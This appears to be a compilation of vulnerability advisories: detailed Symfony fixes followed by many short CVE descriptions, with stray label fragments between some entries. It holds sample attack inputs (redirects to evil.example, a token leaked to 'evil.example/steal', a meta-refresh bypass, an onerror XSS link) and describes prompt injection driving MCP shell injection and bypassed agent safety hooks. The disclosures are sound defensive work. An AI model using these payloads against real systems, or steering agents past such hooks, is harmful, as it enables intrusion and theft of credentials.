Since Symfony 7.3, the require_tls option of EsmtpTransport refuses to send a message over a connection that isn't encrypted. It prevents a network attacker from stripping STARTTLS. But when the server rejected the EHLO command, the transport fell back to HELO and skipped that check.

An attacker in the middle of an SMTP connection that uses STARTTLS could answer EHLO with an error and HELO with a success. The transport then sent the sender, the recipients and the whole message in cleartext, and reported success. No AUTH command is sent on that path, so credentials don't leak.

Connections that use implicit TLS, with smtps:// or port 465, are not affected. Since Symfony 8.1, the Amazon SES SMTP transport enables require_tls by default on ports other than 465 and 2465. So ses+smtp:// DSNs are affected without setting the option.

When TLS is required and the connection isn't encrypted, the transport doesn't fall back to HELO anymore. It throws the same exception as when the server doesn't support STARTTLS.

The router redirects a request to the same URL with or without its trailing slash, or with the scheme that a route requires. To do so, the matcher returns RedirectController::urlRedirectAction() with the path info of the request as path. Since Symfony 5.4.44, 6.4.12 and 7.1.5, urlRedirectAction() turns a path that starts with // into <scheme>://..., so that protocol-relative targets configured in routes work. The path info of a request starts with // when its URI does. So these redirects send the browser to the host written at the start of the path:

GET https://app.example//evil.example/edit/  =>  301 Location: https://evil.example/edit

This affects routes whose path starts with a placeholder that accepts /, like /{path}/edit with the .+ requirement. The trailing-slash redirect applies to all of them, and the scheme redirect to the ones that require a scheme. A front controller in a subdirectory doesn't prevent it.

The matcher now encodes the slash or backslash that follows the leading slash of the path it redirects to, as %2F or %5C. It also does so when tabs or newlines come in between. The target route still matches it, and protocol-relative targets configured in routes keep working.

The matchers of the Routing component encode it too before calling RedirectableUrlMatcherInterface::redirect(), so that other implementations of this method get the encoded path as well.

Since Symfony 5.4.48, 6.4.16, 7.1.9 and 7.2.0, NoPrivateNetworkHttpClient prepares each request with the default options of the library. The decorator then passes all these options to the decorated client. Every option is then already set, so that client ignores its own default options.

When these defaults restrict TLS trust, the restriction is lost without any error. A client created with peer_fingerprint, a private cafile or a minimum crypto_method refuses a server on its own. Once decorated, the same client connects to that server. Someone on the network path with a certificate that the system trust store accepts can then read and answer the requests. Default proxy and max_redirects options were lost the same way. Since Symfony 8.1, DnsResolvingHttpClient is affected too.

This also applies to the default_options of FrameworkBundle, which configure the innermost client.

The decorator now passes the options given to it, plus the ones it manages itself. The decorated client then applies its own default options again.

Since Symfony 5.4.48, 6.4.16, 7.1.9 and 7.2.0, NoPrivateNetworkHttpClient follows redirects itself, and sends each hop as a new request through the client it decorates. Before a redirect to another origin, it removes the Authorization and Cookie headers it knows about. But the decorated client then added its own default options again. These include the auth_basic, auth_bearer and auth_ntlm credentials, and the Authorization and Cookie headers it was created with. Credentials set with withOptions() on the decorator came back the same way, since the decorator forwards them to the decorated client.

These credentials were then sent to any origin that a response redirected to, for example through an open redirect on the server the application calls. The decorated client alone doesn't send them. The decorator removed the ones passed to request(), but not auth_ntlm. Since Symfony 8.1, DnsResolvingHttpClient follows redirects the same way and is affected too.

With auth_ntlm, curl started the NTLM handshake with the other origin, which could answer with a challenge to get the NTLM response of the application.

On a redirect to another origin, the decorator now passes empty Authorization and Cookie headers and unsets the auth_basic, auth_bearer and auth_ntlm options. The decorated client then can't add its own. Decorators between NoPrivateNetworkHttpClient and the transport, like ScopingHttpClient or CachingHttpClient, can't add theirs either.

MetaRefreshAttributeSanitizer checks the URL of a <meta http-equiv="refresh"> directive only when its content starts with a refresh time. Since the fix for CVE-2026-121373, only the ASCII whitespace of the HTML specification could come before that time. Chromium-based browsers also skip a vertical tab and the Unicode spaces U+1680, U+2000 to U+200A, U+2028, U+205F and U+3000.

When the time followed one of these characters, the sanitizer returned the value unchanged. Its URL wasn't checked against allowLinkHosts() and allowLinkSchemes(), and Chromium followed it:

$sanitizer->sanitizeFor('head', "<meta http-equiv=\"refresh\" content=\"\u{3000}0;url=https://evil.example/\">");
// returned unchanged, and Chromium redirects to https://evil.example/

The vertical tab is a regression of the fix for CVE-2026-121373, since the expression used before matched it. The Unicode spaces have been accepted since the sanitizer of meta refresh directives exists.

This requires the configuration of CVE-2026-121373: meta elements allowed with their http-equiv and content attributes, for example with allowStaticElements(), and content sanitized with sanitizeFor('head', ...). Firefox and Safari skip only ASCII whitespace there.

The sanitizer now skips controls, Unicode whitespace and invisible characters before the time, so that it checks the URL of these directives too.

Since Symfony 7.4, CachingHttpClient can cache the responses of HTTP clients, for example when caching is enabled in framework.http_client. Its withOptions() method passes the options to the decorated client only. So credentials set with withOptions(), like auth_bearer, auth_basic, an Authorization header or a Cookie header, reach the server, but CachingHttpClient doesn't see them. They're missing from the cache key. They also miss the rule that keeps a shared cache from storing the responses to requests with an Authorization header. A cacheable response fetched for one user is then served to the next users:

$client->withOptions(['auth_bearer' => $aliceToken])->request('GET', 'https://api.example.com/me'); // Alice's profile
$client->withOptions(['auth_bearer' => $bobToken])->request('GET', 'https://api.example.com/me');   // Alice's profile, from the cache

Applications are affected when they enable caching on a client, set per-user credentials with withOptions(), and request URLs whose responses are cacheable. Credentials passed to request() aren't affected.

Most other options set with withOptions() were ignored too when caching was enabled, because CachingHttpClient forwarded each request with its own defaults. This includes max_redirects, proxy, peer_fingerprint, local_cert, timeout, on_progress and body.

CachingHttpClient::withOptions() now also merges the standard options into its own default options. The cache key, the rules of shared caches and the requests it forwards take them into account. Options that only decorated clients know, like max_retries, are still passed to them only.

Client certificates, proxies and auth_ntlm are now part of the cache key too. When several HTTP clients of FrameworkBundle use the same cache pool, each client gets its own namespace in that pool. So clients with different custom headers don't get the responses of each other anymore.

GuardAuthenticatorHandler::authenticateUserAndHandleSuccess() logs a user in programmatically with a Guard authenticator, for example in the registration controllers that MakerBundle generated. This method creates the token and stores it, but it calls neither checkPreAuth() nor checkPostAuth() on the user checker of the firewall. Guard authenticators run both checks when they authenticate a request.

As a consequence, an account that a user checker rejects in checkPostAuth() could still be logged in through this method, for example an expired account.

Applications are affected when they use Guard with a custom user checker that rejects users in checkPostAuth(), and log users in with authenticateUserAndHandleSuccess(). The default user checker also rejects users of the deprecated User class whose credentials expired. This is the issue of GHSA-8f57-m8wj-x65w, for the Guard component of Symfony 5.4. Guard was removed in Symfony 6.0.

GuardAuthenticatorHandler::authenticateUserAndHandleSuccess() now calls the checkPostAuth() method of the user checker of the firewall before it stores the token. AuthenticatorManager::authenticateUser() does the same since the fix for GHSA-8f57-m8wj-x65w. Like authenticateUser(), authenticateUserAndHandleSuccess() doesn't call checkPreAuth(). Programmatic logins skip this check on purpose, for example right after a registration. SecurityBundle now gives the user checkers of the firewalls to the handler, so both symfony/security-guard and symfony/security-bundle must be updated.

As a consequence, an exception thrown by checkPostAuth() now comes out of authenticateUserAndHandleSuccess(). Code that logs users in programmatically may need to catch it.

NoPrivateNetworkHttpClient accepts a list of subnets to block instead of its default one. When that list contains an IPv6 entry, the client lets IpUtils::checkIp() decide for every address. Before Symfony 6.4.50, 7.4.23 and 8.1.11, checkIp() didn't match an IPv4-mapped address like ::ffff:127.0.0.1 against IPv4 subnets. Such an address connects to the IPv4 host it embeds. So http://[::ffff:127.0.0.1]/, or a host name whose AAAA record contains a mapped address, reaches a blocked IPv4 host:

$client = new NoPrivateNetworkHttpClient(HttpClient::create(), ['10.0.0.0/8', '127.0.0.0/8', '192.168.0.0/16', 'fc00::/7', '::1/128']);
$client->request('GET', 'http://127.0.0.1/');          // blocked
$client->request('GET', 'http://[::ffff:127.0.0.1]/'); // sent to 127.0.0.1

The default list is not affected, since it contains ::ffff:0:0/96.

IpUtils::checkIp() now checks an IPv4-mapped address against IPv4 subnets as the IPv4 host it embeds. Symfony 6.4.50, 7.4.23 and 8.1.11 already do so since the fix for GHSA-xg2q-4rrq-657q, and 5.4 now does too.

The fix is in symfony/http-foundation, so updating symfony/http-client alone isn't enough. On 5.4, trusted proxies and the ips of request matchers now also match IPv4-mapped addresses through IPv4 ranges, as on 6.4 and up. NoPrivateNetworkHttpClient also blocks IPv4-mapped addresses when its custom subnets have no IPv4 entry, since such lists block every IPv4 host.

Since Symfony 7.4, framework.http_client.scoped_clients can enable caching on a scoped client. FrameworkBundle then puts a CachingHttpClient inside the ScopingHttpClient, with the options of the scope as default options. CachingHttpClient merges them into every request. So the credentials of the scope, like auth_bearer, auth_basic or an Authorization header, are also sent to URLs outside the scope:

framework:
    http_client:
        scoped_clients:
            github.client:
                base_uri: 'https://api.github.com'
                headers: { Authorization: 'token GH-SECRET' }
                caching: { enabled: true }

$githubClient->request('GET', 'https://evil.example/steal'); // sent with "Authorization: token GH-SECRET"

Every option of the scope applies outside of it, not only the credentials, for example verify_peer: false, a client certificate, proxy or resolve. Without caching, ScopingHttpClient sends no option of the scope to evil.example. Applications are affected when a scoped client with caching enabled requests a URL that an attacker can influence, absolute URLs included.

The CachingHttpClient of a scoped client is now registered without default options. ScopingHttpClient already applies them to the requests that match the scope.

The fix for CVE-2026-45065 (GHSA-72xp-p242-47p9) anchored the requirements that UrlGenerator checks parameter values against. That check doesn't run when framework.router.strict_requirements is null, which the routing recipe sets in the prod environment. There, a first placeholder whose value starts with / still gives a protocol-relative URL, as in the original report:

path('blog_rss', {_locale: '/evil.com'})  =>  //evil.com/blog/rss.xml

Requirements that accept /, like .+, give such URLs in every environment.

Applications are exposed when untrusted values reach these parameters, for example when they pass the query string of the request to path() or url(). A route that uses RedirectController::redirectAction() with keepQueryParams: true does the same, when the target route has a placeholder that the redirecting route doesn't define.

UrlGenerator now encodes the leading // of a URL that has no scheme and host as /%2F. It also rejects parameters that add %2E or %2E%2E segments to the path, which browsers resolve like . and ... These checks apply whatever strict_requirements is set to. When strict_requirements is false or null, the generator logs an error and returns an empty string instead of throwing.

The fix for CVE-2026-123339 (GHSA-wg5q-m2ww-f3c9) restores the router context of the main request after an inline fragment, but the cause of that issue is still there. A page can render an inline fragment with render() in Twig, or with an ESI tag when no gateway cache is used. While the fragment runs, SubRequestHandler adds 127.0.0.1 to the trusted proxies of every request. Code that reads the main request during that time trusts its X-Forwarded-* and Forwarded headers if the main request came from 127.0.0.1.

Symfony itself reads the main request there:
- asset() takes the base path and the scheme of the main request. With X-Forwarded-Prefix: //evil.example, asset('build/app.js') returns //evil.example/build/app.js, a script loaded from another host. Request::getBasePath() keeps its first result, so when it's first computed inside the fragment, the later asset() calls of the page return such URLs too.
- absolute_url() in Twig, through UrlHelper, takes the host and the scheme of the main request from X-Forwarded-Host and X-Forwarded-Proto.

When a shared cache stores the page, every visitor gets these URLs. With asset(), the page then runs scripts from a host chosen by the attacker.

This affects applications reached over HTTP from 127.0.0.1 when that address isn't a trusted proxy. That's the case behind a TLS terminator, a reverse proxy or an HTTP cache running on the same host. When framework.trusted_proxies is not configured, which is the default, every forwarded header is trusted during that window, X-Forwarded-Prefix included. Configuring framework.trusted_hosts doesn't help with asset(), since the prefix is not a host. Applications that get requests directly through php-fpm or mod_php are not affected, and neither are those behind a proxy on another host. REMOTE_ADDR is not 127.0.0.1 there.

SubRequestHandler doesn't change the trusted proxies of every request anymore. Only the requests it builds, and the requests copied from them, trust 127.0.0.1. While a fragment renders, the main request keeps ignoring the forwarded headers sent by the client.

symfony/http-kernel now requires the version of symfony/http-foundation that contains this fix.

A vulnerability has been identified in the Linux kernel's ksmbd component (kernel SMB/CIFS server). A security control designed to prevent dictionary attacks, which introduces a 5-second delay during session setup, can be bypassed through the use of asynchronous requests. This bypass negates the intended anti-brute-force protection, potentially allowing attackers to conduct dictionary attacks more efficiently against user credentials or other authentication mechanisms.

Buffer overflow vulnerabilities exist in some Uniview NVR products. An authenticated attacker could exploit these vulnerabilities by sending specially crafted packets to affected devices. Successful exploitation may result in a temporary web service denial of service (DoS).

The WP Page Builder WordPress plugin through 1.2.8 does not check that the user has permission to edit the targeted post before switching which editor's content is rendered for it, allowing users with a role as low as Subscriber to change what any post or page displays, by switching it between its normal content and its stored page builder content.

The WP Meta SEO WordPress plugin through 4.5.18 does not check that the user is allowed to edit the post or comment containing an indexed link before rewriting or removing that link, allowing users with a role as low as Contributor to change the target and text of links in, or strip links from, any post or comment.

The WP Page Builder WordPress plugin through 1.2.8 does not check capabilities or nonces in one of its AJAX actions, allowing any authenticated user, such as a subscriber, to read, add, overwrite and delete the builder's saved sections, and to store arbitrary HTML that is rendered unescaped to an administrator who opens a crafted link.

The WP Page Builder WordPress plugin through 1.2.8 does not sanitise and escape some of its layout settings before outputting them in pages, and does not check that the user may edit the post being saved, allowing users with a role as low as Contributor to inject stored Cross-Site Scripting payloads into any post or page, including ones they cannot edit.

The Web To Print Shop : uDraw WordPress plugin through 3.4.0 does not restrict the file paths, extensions or contents written by one of its unauthenticated AJAX actions, allowing unauthenticated users to write arbitrary PHP files to a web-accessible directory and execute code on the server.

The Web To Print Shop : uDraw WordPress plugin through 3.4.0 does not validate a user-supplied file path before deleting it, allowing unauthenticated users to delete image and PDF files anywhere the web server can write, including the whole media library.

The Web To Print Shop : uDraw WordPress plugin through 3.4.0 does not sanitise and escape a parameter before using it in a SQL statement, allowing unauthenticated users to perform SQL injection attacks.

The Web To Print Shop : uDraw WordPress plugin through 3.4.0 does not validate the type or content of files uploaded through several unauthenticated AJAX actions, allowing unauthenticated users to store SVG files containing JavaScript, which are served from the site's own origin and executed in the browser of any user who opens them, such as an administrator.

The ADDRESSYA WordPress plugin through 3.1.1 does not have authorisation and CSRF checks when saving its service credentials, and does not escape them when outputting them in an admin page, allowing unauthenticated users to perform Stored Cross-Site Scripting attacks against administrators.

This is only exploitable on PHP 7.x.

cves.d: A flaw was found in libefiboot, a component of efivar. The device path node parser in libefiboot fails to validate that each node's Length field is at least 4 bytes, which is the minimum size for an EFI (Extensible Firmware Interface) device path node header. A local user could exploit this vulnerability by providing a specially crafted device path node. This can lead to infinite recursion, causing stack exhaustion and a process crash, resulting in a denial of service (DoS).

vp: adobe experience manager as a cloud service

cves.d:
When sftpEnabled=true (the default configuration in etc/org.apache.karaf.shell.cfg), the SSH server exposes the karaf.base directory tree through the MINA SSHD SFTP subsystem and SCP command factory without verifying the authenticated user's roles beyond the initial sshRole login check. Consequently, an authenticated user with only low-privileged roles (such as viewer and ssh) can read sensitive configuration and key files (including etc/users.properties and etc/host.key) or write arbitrary bundles/configurations into monitored directories (such as deploy/ or etc/), leading to privilege escalation and arbitrary code execution.


Apache Karaf 4.4.13 and 4.5.0 introduce the sftpRole configuration property in org.apache.karaf.shell (defaulting to admin) and enforce role-based access control on SFTP subsystem creation, SCP command execution, and virtual filesystem access.

Mitigation / WorkaroundUsers are recommended to upgrade to Apache Karaf 4.4.13 or 4.5.0.




On earlier versions where SFTP/SCP access is not required, set sftpEnabled=false in etc/org.apache.karaf.shell.cfg and restart the SSH server bundle (or Karaf instance).

In Apache Karaf, the default command ACL configuration for the feature scope (etc/org.apache.karaf.command.acl.feature.cfg, defined in assemblies/features/standard/src/main/feature/feature.xml and the child-instance template instance/src/main/resources/org/apache/karaf/instance/resources/etc/org.apache.karaf.command.acl.feature.cfg) restricts feature:install, feature:uninstall, feature:start, and feature:stop to users with the admin role, while leaving feature:requirement-add and feature:requirement-remove without ACL entries.


Because Karaf's command guard (SecuredSessionFactoryImpl) allows commands with no matching ACL rule (NO_MATCH) to execute, an authenticated SSH user holding only the ssh and viewer roles can execute feature:requirement-add bundle:<uri> (or feature:<name>). RequirementAdd forwards the requirement directly to FeatureService.addRequirements(), causing the resolver to download, install, and start an arbitrary bundle with the Karaf JVM process's full authority, bypassing the admin-only restrictions on feature:install and bundle:install. Similarly, feature:requirement-remove allows removing provisioning requirements and uninstalling features/bundles.

MitigationUsers are recommended to upgrade to Apache Karaf 4.4.13 or 4.5.0.




For existing deployments or upgrades that preserve existing files in etc/, add the following rules to etc/org.apache.karaf.command.acl.feature.cfg (and any child instance etc/org.apache.karaf.command.acl.feature.cfg files):




requirement-add = admin 

requirement-remove = admin
Failure to sanitize special elements into a different plane (special element injection) in Azure App Service allows an unauthorized attacker to elevate privileges over a network.

Dell PowerStore contains an OS Command Injection vulnerability. An authenticated user with limited privileges could potentially exploit this vulnerability, potentially leading to privilege escalation to root on the appliance.

The shell command ACL for the feature scope (etc/org.apache.karaf.command.acl.feature.cfg) restricts feature:install, feature:uninstall, feature:start and feature:stop to the admin role, but had no entry for feature:requirement-add or feature:requirement-remove.

The provisioning resolver turns a requirement into the same install/start (or uninstall) action as feature:install / feature:uninstall: a bundle: requirement causes an arbitrary bundle to be downloaded and started, and a feature: requirement installs that feature. Because the two commands had no ACL, a user authenticated with only the viewer (and ssh) role could invoke them and cause Apache Karaf to download, install and start an attacker-chosen bundle, which then runs with the full authority of the Karaf process — thereby bypassing the admin-only authorization enforced on feature:install and bundle:install.

This is the same class of issue as the feature:repo-add -i / feature:repo-remove -u bypass, on sibling commands not covered by that earlier fix.Mitigation:Upgrade to Apache Karaf 4.4.12 or 4.5.0 (or later), which restrict feature:requirement-add and feature:requirement-remove to the admin role.

As an interim workaround on affected versions, add the following two lines to etc/org.apache.karaf.command.acl.feature.cfg; the change is picked up at runtime without a restart:

requirement-add = admin

requirement-remove = admin

Privilege escalation due to incorrect boundary conditions in the Audio/Video: Playback component. This vulnerability was fixed in Firefox 161, Firefox ESR 115.46, Firefox ESR 153.8, Thunderbird 161, and Thunderbird 153.8.

devpi-web before 5.2.0 contains an unauthenticated path traversal vulnerability in the +doc documentation route because docs_file_exists and docs_file_path in doczip.py never confine relpath to the documentation directory. Attackers can request a relpath with a leading // or percent-encoded .. segments to read server files, including the keyfs sqlite database holding password hashes.

Cesanta Mongoose 7.21 before 7.24 contains an out-of-bounds read vulnerability in rx_ip6() checksum validation that allows remote unauthenticated attackers to read past received packets by sending IPv6 extension headers. Attackers can send a single IPv6 TCP or ICMPv6 packet with extension headers, causing tcp6csum_ok() and icmp6csum_ok() to use the full payload length and read adjacent receive-buffer memory.

audio-separator before 0.47.2 contains an insecure deserialization vulnerability that allows attackers to execute code by supplying malicious Demucs .th model files loaded via torch.load with weights_only=False. Local users writing to the shared /tmp/audio-separator-models/ default directory, or attackers controlling unverified model download sources, can execute code when victims run Demucs separation.

A flaw has been found in highlight highlight.js up to 11.12.0. The affected element is the function hljs.highlight of the file src/languages/livescript.js of the component Language Grammar Handler. Executing a manipulation of the argument text can lead to inefficient regular expression complexity. The attack can be launched remotely. The exploit has been published and may be used. The pull request to fix this issue awaits acceptance.

Deserialization of Untrusted Data vulnerability in lasp-lang partisan allows an unauthenticated remote attacker to abort the Erlang VM of a node via Excessive Allocation. partisan_peer_service_server:handle_info/2 decodes every frame that arrives on the peer listener with binary_to_term/1, without the safe option, before handle_inbound/2 interprets the message and before any peer authentication takes place. TLS is off by default and the listener accepts connections from any host, so one frame that names more atoms than the atom table holds aborts the VM. partisan_peer_service_client:handle_info/2 decodes frames from the server side of a connection the same way.

The decode also materializes funs, ports and references the frame encodes and inflates compressed terms. The demonstrated impact is denial of service. partisan does not invoke decoded funs, so code execution was not shown.

This issue affects partisan: from 3.0.0 before 6.4.0.

A flaw has been found in continuedev continue up to 2.1.0. This affects the function DataLogger.logDevData of the file core/data/log.ts of the component Dev Data Logging. This manipulation causes information disclosure. The attack can be initiated remotely. The vendor was contacted early about this disclosure but did not respond in any way.

Improper Neutralization of Script in Attributes in a Web Page vulnerability in pragdave earmark allows stored cross-site scripting via unescaped HTML attribute values. Earmark.Transform._make_att1/2 in lib/earmark/transform.ex splices attribute values verbatim between two literal " bytes: [" ", name, "=\"" , value, "\""]. Text nodes are routed through the existing escape function which encodes " as ", but attribute values never visit that path. A markdown link whose URL or title contains a bare " closes the attribute early and lets the trailing bytes be parsed by the browser as fresh HTML attributes. For example, [click](http://example.com/?a=x" onerror="alert(1)) renders as click, executing arbitrary JavaScript in the victim's browser. The earmark library is no longer maintained and has been retired on Hex. No patched version will be released. All releases from 1.4.1 onward are affected, and users should migrate to a maintained Markdown library such as MDEx. This issue affects earmark: from 1.4.1 onward.

LibreChat is an enhanced ChatGPT clone that supports multiple AI providers. Prior to 0.8.6, POST /api/messages/:conversationId authorizes req.params.conversationId in api/server/middleware/validateMessageReq.js but persists attacker-controlled req.body.conversationId through api/server/routes/messages.js. An authenticated attacker can use an owned conversation in the URL while naming a victim conversation in the body, causing an attacker-controlled message to be stored in the victim conversation. This issue is fixed in version 0.8.6.

LibreChat is an enhanced ChatGPT clone that supports multiple AI providers. Prior to 0.8.8, packages/api/src/mcp/oauth/handler.ts createOAuthFetch validates only the initial destination for MCP OAuth discovery, registration, token, refresh, and revocation requests, then uses redirect-following fetch behavior without validating each redirect target. An attacker who can initiate MCP OAuth against a controlled endpoint can redirect server requests to internal or private addresses, reaching services that the initial SSRF checks should block. The separate MCP transport path already validates redirects and is not affected. This issue is fixed in version 0.8.8.

LibreChat is an enhanced ChatGPT clone that supports multiple AI providers. Prior to 0.8.7, POST /api/auth/2fa/verify-temp in api/server/routes/auth.js calls verify2FAWithTempToken and accepts repeated TOTP or backup-code guesses without a dedicated attempt limiter. An attacker must first possess valid primary credentials and a valid five-minute temp token, but can then make repeated second-factor attempts and obtain a full session if a valid code is guessed. This issue is fixed in version 0.8.7.

codebase-memory-mcp provides local code intelligence for developers and AI agents through a persistent graph and MCP tools. Prior to 0.9.0, automatic import of a repository's .codebase-memory/ artifact allocated a decompression buffer using the attacker-controlled 64-bit original_size value from artifact.json but truncated that value to int when passing the destination capacity to the Zstandard decompressor. A value with bit 31 set became negative and was sign-extended to a large size_t, allowing the decompressor to write frame content beyond the actual allocation. Indexing a malicious repository containing the crafted artifact could corrupt heap memory with attacker-controlled bytes, causing a reliable crash and potentially code execution. This issue is fixed in version 0.9.0.

A vulnerability was determined in Soar Cloud System Human Resources up to 7.3.2026.0112. This impacts an unknown function of the file /client.aspx. Executing a manipulation can lead to cross site scripting. The attack can be executed remotely. The exploit has been publicly disclosed and may be utilized. The vendor was contacted early about this disclosure but did not respond in any way.

MapServer is a system for developing web-based GIS applications. Prior to 8.6.5, MapServer's PostgreSQL JOIN implementation in src/mappostgresql.c copies the source layer attribute selected by JOIN FROM into joininfo->from_value and embeds it without parameterization or escaping into a dynamically generated PostgreSQL query executed by PQexec(). When PostgreSQL JOIN support is enabled, an attacker who can control that source feature attribute can inject quote characters and SQL operators that alter the intended WHERE predicate. This second-order injection can cause unintended rows and JOIN attributes to be returned, potentially exposing information from unrelated PostgreSQL records. This issue is fixed in version 8.6.5.

MapServer is a system for developing web-based GIS applications. Prior to 8.6.5, an unauthenticated reflected cross-site scripting vulnerability in OGC API Features collection-items HTML output allows crafted offset or limit query parameter values from raw CGI request handling in src/mapogcapi.cpp to reach template.params.offset or template.params.limit. share/ogcapi/templates/html-bootstrap/collection-items.html inserts those values without quoting or escaping into a script element. A victim who follows a crafted request can have the script element terminated by attacker-controlled markup, causing arbitrary JavaScript to execute under the MapServer origin and enabling access to browser-session data, actions as the victim, and content manipulation. This issue is fixed in 8.6.5.

NukeViet CMS is a multi Content Management System. Prior to 4.5.12 and 4.6.02, an attacker who can reach an image-upload flow can upload a valid image with appended PHP short-tag code and a double-extension filename. NukeViet\Files\Upload::save_file() relied on verify_image(), which missed the <? short-open tag, while filename handling preserved embedded dots, validation inspected only the final extension, and an .htaccess rule blocked PHP extensions only at the end of the URI. On Apache mod_php systems configured with short_open_tag and a PHP extension handler, the stored polyglot can execute as PHP and run operating-system commands as the web-server user; PHP-FPM, nginx, and end-anchored handler configurations are not exposed to the execution step. This issue is fixed in versions 4.5.12 and 4.6.02.

NukeViet CMS is a multi Content Management System. In 4.6.00, an unauthenticated attacker can place the configured domain in X-Forwarded-Host while choosing a different destination in the ordinary Host header. The earlier fix validates only the forwarded value in includes/mainfile.php, while set_ini_file() in includes/ini.php constructs an outbound cURL request from the separately retained NV_SERVER_NAME before the ordinary host is rejected. Redirect following can carry the blind request to an attacker-selected private host, port, and path and invoke internal HTTP endpoints. This issue is fixed in version 4.6.01.

NukeViet CMS is a multi Content Management System. Prior to 4.5.09, a user with news-posting permission can bypass NukeViet\Core\Request::filterAttr() by prefixing an event-handler attribute with an ASCII form-feed character, which PHP trimming preserves but browsers treat as whitespace. NukeViet\Core\Request::unhtmlentities() omitted a decimal HTML entity tab embedded in a javascript: URI. These parser differences allow persistent event handlers or script URLs to survive filtering in vendor/vinades/nukeviet/Core/Request.php and execute for visitors, including administrators. This issue is fixed in version 4.5.09.

mcp-ssh-manager is an MCP server for managing servers over SSH with human approval, an encrypted vault, and a live audit trail. Prior to 3.8.5, ssh_backup_create, ssh_backup_restore, ssh_backup_schedule, and ssh_backup_list build remote shell commands from caller-controlled values in src/backup-manager.js and inline backup handlers in src/index.js without neutralizing shell metacharacters. Crafted database, connection, backup directory, path, exclusion, schedule, or comment arguments can therefore execute arbitrary OS commands on managed remote servers as the configured SSH user. ssh_backup_schedule can persist execution through cron. ssh_backup_list does not pass through the server policy check and remains available in readonly and restricted modes, allowing command execution despite those restrictions. Tool arguments can be supplied by a malicious or compromised MCP client or steered through indirect prompt injection; fully trusted benign arguments do not trigger the issue. The earlier database-helper remediation for CVE-2026-77383 applied shell quoting to src/database-manager.js but did not cover these parallel backup builders. This issue is fixed in version 3.8.5.

mcp-ssh-manager is an MCP server for managing servers over SSH with human approval, an encrypted vault, and a live audit trail. Prior to 3.6.7, ssh_db_list, ssh_db_dump, ssh_db_import, and ssh_db_restore in src/database-manager.js interpolate caller-controlled database, table, collection, file path, user, host, port, and password values into shell-evaluated command strings without neutralization. Shell metacharacters in these arguments therefore execute arbitrary commands on the configured SSH target as the account used by the MCP server. ssh_db_list is classified as read-only and remains available in readonly and restricted server security modes, so this path bypasses the command-execution boundary those modes are intended to enforce. The dump and import builders are blocked in readonly mode but remain vulnerable in the default unrestricted mode. The earlier version 3.6.5 hardening covered only ssh_db_query query text; it did not protect the list, dump, import, or restore builders, or the connection flags used by query builders. This issue is fixed in version 3.6.7.

pmo-platform is a modular PMO and release-management platform for Claude Code. Prior to 3.69.1, core/hooks/block-credential-reads.sh, core/hooks/block-egress.sh, core/hooks/block-fs-boundary.sh, and core/hooks/block-mcp-writes.sh pin PATH to /usr/bin:/bin, hard-code jq as /usr/bin/jq, and return success when jq is unavailable there. On systems where jq exists only in a Homebrew path, including affected pre-Sequoia or Homebrew-only macOS installations, the hooks can skip credential-read, network-egress, filesystem-boundary, and MCP-write controls. Native deny rules independently protect some credential paths but do not backstop the egress or MCP controls. An attacker who can influence a prompt, repository, or evaluation flow can use the skipped checks to expose secrets or perform unauthorized tool actions. This issue is fixed in version 3.69.1.

A flaw was found in the quarkus-rest-jsonb component of Quarkus. An unauthenticated remote attacker can cause a Denial of Service (DoS) by sending HTTP requests containing deeply nested JSON payloads to vulnerable endpoints. The application fails during JSON parsing and records an excessively large error trace for each small request. This disproportionate log amplification can exhaust system disk space or overwhelm log processing pipelines, degrading service availability.

LinkAce is a self-hosted archive to collect website links. Prior to 2.6.0, the authenticated GET /lists/{list}/feed and GET /tags/{tag}/feed handlers in app/Http/Controllers/App/FeedController.php use integer route model binding without an object-level authorization or visibility check. Unlike the web list controller, which invokes LinkListPolicy::view(), the feed controller lets a normal authenticated user enumerate another user's private list or tag and receive its name and feed metadata, along with public or internal bookmark entries associated with that taxonomy. The existing per-link visibility filter still excludes PRIVATE link records, so the disclosure is limited to the private taxonomy and its non-private member links. This issue is fixed in version 2.6.0.

Netatalk is a Free and Open Source file server suite for Unix-like operating systems. From 3.1.0 until 4.5.1, the afpd Spotlight RPC fetchQueryResultsForContext: reply path in etc/afpd/spotlight_marshalling.c calls the top-level sl_pack function from sl_pack_filemeta on a shifted sub-buffer without passing the remaining capacity of the outer DSI reply buffer. An authenticated AFP client can request an amplified nested file-metadata tree so the nested packer applies MAX_SLQ_DAT relative to the shifted pointer and writes beyond struct DSI::data. The out-of-bounds write corrupts heap memory beyond the DSI reply buffer. This issue is fixed in version 4.5.1.

Netatalk is a Free and Open Source file server suite for Unix-like operating systems. From 3.1.0 until 4.5.0, sl_unpack_loop in etc/afpd/spotlight_marshalling.c uses an attacker-controlled Spotlight table-of-contents index during FPSpotlightRPC without checking it against the number of entries or the remaining dsi->commands buffer. An authenticated AFP client with access to a Spotlight-enabled volume can choose a large toc_index whose multiplication and addition produce an out-of-range address, causing an attacker-influenced heap read and reliably crashing the worker serving that session. The earlier CVE-2026-44066 remediation bounded recursion depth and toc_offset but did not bound toc_index. This issue is fixed in version 4.5.0.

Netatalk is a Free and Open Source file server suite for Unix-like operating systems. From 3.1.0 until 4.5.0, the afpd FPSpotlightRPC unmarshalling handlers in etc/afpd/spotlight_marshalling.c trust the element count encoded in the upper 32 bits of an RPC tag without comparing it with the remaining input length. An authenticated client with access to a Spotlight-enabled volume can make sl_unpack_ints, sl_unpack_date, sl_unpack_uuid, or sl_unpack_floats iterate beyond dsi->commands and read heap memory. The read values remain in internal dalloc storage and no information-disclosure channel was demonstrated, but the worker serving the attacker's session can be crashed. This issue is fixed in version 4.5.0.

Inscriptis is a Python library for converting HTML to text. From 2.0.0 until 2.7.6, when the parent is block-level, table_end_handler() in model/tag/table_tag.py writes each sibling table through HtmlElement.write_verbatim_text() in model/html_element.py; Canvas.open_block() leaves the parent padding_inline prefix on the stack, Canvas.close_block() does not remove it, and only Canvas.close_tag() calls prefix.remove_last_prefix(). Each following sibling table therefore carries forward accumulated indentation, making get_text() output grow quadratically and allowing small attacker-controlled HTML to exhaust memory in applications converting it without authentication or user interaction. This issue is fixed in 2.7.6.

memtomem-stm is a short-term memory proxy gateway with proactive memory surfacing for AI agents. From 0.1.0 until 0.1.34, untrusted long-term and working-memory fields can introduce Markdown or HTML-compatible structure into the surfaced-memory envelope because those fields are not serialized as inert data. A crafted memory can create misleading structural boundaries or visually conceal surfaced content, affecting how a consuming agent interprets the memory context. Ordinary natural-language persuasion remains a residual model-level risk and is outside the structural serialization flaw. This issue is fixed in version 0.1.34.

